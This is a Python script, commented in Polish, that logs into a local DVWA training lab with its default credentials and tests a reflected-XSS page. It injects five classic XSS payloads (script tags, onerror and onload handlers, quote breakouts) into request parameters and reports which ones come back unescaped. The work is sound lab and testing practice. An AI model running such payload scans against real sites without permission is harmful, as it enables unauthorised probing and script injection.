import requests
from urllib.parse import urlparse, parse_qs, urlencode
import re

# klasyczne payloady dla xss, celem jest uruchomienie alert(1)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\" onmouseover=\"alert(1)",
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "';alert(1);//",
]

login_url = "http://localhost/login.php"
dvwa_url = "http://localhost/vulnerabilities/xss_r/?name=test"

# dane logowania
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

# funkcja do logowania z pobraniem tokena
def login(session):
    # pobieramy stronę logowania, żeby dostać token
    r = session.get(login_url)
    match = re.search(r'user_token\' value=\'([a-z0-9]+)\'', r.text)
    if not match:
        print("[-] Nie znaleziono user_token, logowanie nie powiedzie się.")
        return False

    token = match.group(1)
    login_data["user_token"] = token

    # wysyłamy POST z tokenem
    response = session.post(login_url, data=login_data)
    return "DVWA Security" in response.text  # potwierdzamy czy się udało

# główna funkcja
def test_xss(url, method="GET", data=None):
    print(f"[*] Testowanie {url}")
    vulnerable = False

    session = requests.Session()
    if not login(session):
        print("[-] Logowanie nie powiodło się.")
        return

    for payload in XSS_PAYLOADS:
        if method.upper() == "GET":
            parsed_url = urlparse(url)
            query = parse_qs(parsed_url.query)
            for param in query:
                original = query[param][0]
                query[param][0] = payload
                new_query = urlencode(query, doseq=True)
                new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                response = session.get(new_url)

                if payload in response.text:
                    print(f"[!] Mozliwa podatnosc XSS w parametrze '{param}' przy payloadzie: {payload}")
                    vulnerable = True

        elif method.upper() == "POST" and data:
            for param in data:
                original = data[param]
                data[param] = payload
                response = session.post(url, data=data)
                if payload in response.text:
                    print(f"[!] Mozliwa podatnosc XSS w parametrze '{param}' przy payloadzie: {payload}")
                    vulnerable = True
                data[param] = original
        else:
            print("[!] Nieprawidlowa metoda lub brak danych do POST.")
            return
    
    if not vulnerable:
        print("[+] Nie wykryto podatnosci XSS.")

# uruchomienie
if __name__ == "__main__":
    test_xss(dvwa_url, method="GET")
